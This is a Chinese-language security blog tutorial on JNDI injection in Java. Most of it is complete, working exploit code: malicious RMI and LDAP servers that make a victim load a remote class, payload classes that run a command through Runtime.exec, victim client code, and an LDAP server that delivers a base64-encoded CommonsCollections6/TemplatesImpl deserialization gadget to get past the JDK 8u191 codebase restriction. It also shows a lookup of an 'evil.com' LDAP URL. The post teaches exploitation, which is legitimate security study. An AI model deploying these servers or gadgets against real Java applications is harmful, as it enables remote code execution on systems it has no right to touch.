---
title: "JNDI注入"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# JNDI注入

实战经常遇到，只会打不动原理，现在来浅学一下

## JNDI

JNDI（Java Naming and Directory Interface）是 Java 为统一访问各种“命名”和“目录”服务而设计的一套标准接口（位于 `javax.naming.*`）

JNDI设计了一套标准:

| 服务          | 功能             | JNDI SPI 包                                        | 典型 URL                                      |
| ------------- | ---------------- | -------------------------------------------------- | --------------------------------------------- |
| **LDAP**      | 目录 + 命名      | `com.sun.jndi.ldap.LdapCtxFactory`                 | `ldap://host:389/ou=People,dc=example,dc=com` |
| **DNS**       | 命名             | `com.sun.jndi.dns.DnsContextFactory`               | `dns://8.8.8.8/google.com`                    |
| **RMI**       | 远程对象命名     | `com.sun.jndi.rmi.registry.RegistryContextFactory` | `rmi://host:1099/HelloObj`                    |
| **CORBA COS** | 分布式对象目录   | `com.sun.jndi.cosnaming.CNCtxFactory`              | `corbaname::host:1050#MyService`              |
| **文件系统**  | 把文件路径当名字 | `com.sun.jndi.fscontext.RefFSContextFactory`       | `file:/tmp/jndiref`                           |

这使得所有的命名和目录服务都可以使用同一套代码进行调用；

~~~java
Context ctx = new InitialContext();     // 初始化上下文
Object obj = ctx.lookup("ldap://evil.com/a"); // 同一行代码可换任何协议
~~~

我们看到这个代码其实已经可以思考了，如果这个lookup方法内的参数可控，那么我们就可以利用JNDI加载任意的java恶意class或恶意反序列化数据

## RMI

接下来学习很常用的trick，利用RMI服务来进行JNDI注入

### RMIServer

我们先写一个RMIServer：

首先在本机的1099端口起了一个RMI Registry注册表：

```java
LocateRegistry.createRegistry(1099);
```

然后构造一个恶意对象，此处Reference是 JNDI 提供的对象引用封装，用于告诉客户端应该去`http://127.0.0.1:5002/`下载class文件，然后用指定工厂类实例化

~~~java
Reference reference = new Reference(
        "RMIPoc",                 // 类名
        "RMIPoc",                 // 工厂类名（加载后实例化）
        "http://127.0.0.1:5002/"); // 远程 codebase（jar/class 下载地址）
~~~

接下来把非远程对象 Reference包成远程对象存根ReferenceWrapper，让其能通过 RMI 传输：

~~~java
ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
~~~

然后把hello绑定到注册表，客户端可以通过`rmi://<attacker-ip>:1099/hello`进行访问

~~~java
Naming.bind("hello",refObjWrapper);
~~~

完整代码如下：

~~~java
package com.yuy0ung;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {
    void register() throws Exception{
        LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("RMIPoc","RMIPoc","http://127.0.0.1:5003/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        Naming.bind("hello",refObjWrapper);
        System.out.println("START RUN");
    }
    public static void main(String[] args) throws Exception {
        new RMIServer().register();
    }
}
~~~

运行后就可以启动一个RMIServer了，只要客户端访问该服务，就会返回ReferenceWrapper存根，客户端就会根据ReferenceWrapper里的地址（此处是`http://127.0.0.1:5003/`）去访问下载RMIPoc.class文件并实例化

### RMIPoc

那么我们的class文件应该怎么构造呢？

需要注意的是，注意，该类需要继承`ObjectFactory`类，并且构造函数需要为`public`：

~~~java
package com.yuy0ung;

import javax.lang.model.element.Name;
import javax.naming.Context;
import java.io.IOException;
import java.rmi.RemoteException;
import java.util.Hashtable;

public class RMIPoc {
    public RMIPoc() throws RemoteException {
        super();
        try {
            Runtime.getRuntime().exec("open -a calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}

~~~

编译一下，再起一个http服务：
![QQ_1762149669405](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762149669405.png)

现在客户端就可以来访问并下载class文件了

### RMIClient

接下来构建一个客户端模拟受害者，用前面提到的用法即可：

~~~java
package com.yuy0ung;

import javax.naming.InitialContext;

public class RMIClient {
    public static void main(String[]args) throws Exception {
        String string = "rmi://localhost:1099/hello";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(string);
    }
}
~~~

运行即可执行命令，弹出计算器：

![QQ_1762149699771](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762149699771.png)

上面完成的就是利用RMI服务来进行的JNDI注入攻击

## LDAP

接下来学习如何使用LDAP服务进行JNDI注入

学过AD域的应该比较熟悉LDAP，LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容

### LDAPServer

我们可以使用LDAP服务来存储Java对象，如果我们此时能够控制JNDI去访问存储在LDAP中的Java恶意对象，那么就有可能达到攻击的目的，LDAP能够存储的Java对象如下

- Java 序列化
- JNDI的References
- Marshalled对象
- Remote Location

配置server前，先下载LDAP依赖：

~~~java
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>3.1.1</version>
    <scope>test</scope>
</dependency>
~~~

完整代码：

~~~java
package com.yuy0ung;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LDAPServer {
    private static final String LDAP_BASE = "dc=yuy0ung,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:5003/#LDAPPoc"};
        int port = 9999;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
~~~

### LDAPPoc

poc也差不多：

~~~java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class LDAPPoc implements ObjectFactory {
    public LDAPPoc() throws Exception{
        try {
            Runtime.getRuntime().exec("open -a calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
~~~

### LDAPClient

~~~java
package com.yuy0ung;

import javax.naming.InitialContext;

public class LDAPClient {
    public static void main(String[]args) throws Exception{
        String string = "ldap://localhost:9999/LDAPPoc";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(string);
    }
}
~~~

最后一样的用法，成功命令执行：

![image-20251103143939872](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251103143939872.png)

## 绕过高版本限制

### 使用本地的Reference Factory类

8u191后已经默认不允许加载`codebase`中的远程类，但我们可以从本地加载合适`Reference Factory`。

需要注意是，该本地工厂类必须实现`javax.naming.spi.ObjectFactory`接口,因为在`javax.naming.spi.NamingManager#getObjectFactoryFromReference`最后的`return`语句对`Factory`类的实例对象进行了类型转换，并且该工厂类至少存在一个`getObjectInstance()`方法。

#### Tomcat8

`org.apache.naming.factory.BeanFactory`就是满足条件之一，并由于该类存在于Tomcat8依赖包中，攻击面和成功率还是比较高的。

`org.apache.naming.factory.BeanFactory` 在 `getObjectInstance()` 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。

#### 反序列化绕过

因为LDAP 还可以存储序列化的数据，那么如果LDAP存储的某个对象的 `javaSerializedData` 值不为空，则客户端会通过调用 `obj.decodeObject()` 对该属性值内容进行反序列化。如果客户端存在反序列化相关组件漏洞，则我们可以通过LDAP来传输恶意序列化对象。

只需要稍微修改一下server的代码（我这里用的CC6+Templates动态加载字节码）：

~~~java
package com.yuy0ung;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;
import java.util.Base64;

public class LDAP_BS {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1/#BS"};
        int port = 9999;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            e.addAttribute("javaClassName", "foo");
            //getObject获取Gadget
            e.addAttribute("javaSerializedData", Base64.getDecoder().decode(            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAHeXV5MHVuZ3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAVTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABi3K/rq+AAAANAA2CgAJACUKACYAJwgAKAoAJgApBwAqBwArCgAGACwHAC0HAC4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFUxjb20veXV5MHVuZy9SQ0VUZXN0OwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEADFJDRVRlc3QuamF2YQwACgALBwAwDAAxADIBABJvcGVuIC1hIGNhbGN1bGF0b3IMADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQATY29tL3l1eTB1bmcvUkNFVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACgAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAFQAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAGAAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAA4ACQARAAwADwANABAAFgASAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACRwdAASSGVsbG9UZW1wbGF0ZXNJbXBscHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwc3EAfgAAP0AAAAAAAAx3CAAAABAAAAABdAAFdmFsdWVxAH4ABnh4dAAHeXV5MXVuZ3g="
            ));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
~~~

运行客户端即可触发反序列化：
![QQ_1762153647837](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762153647837.png)

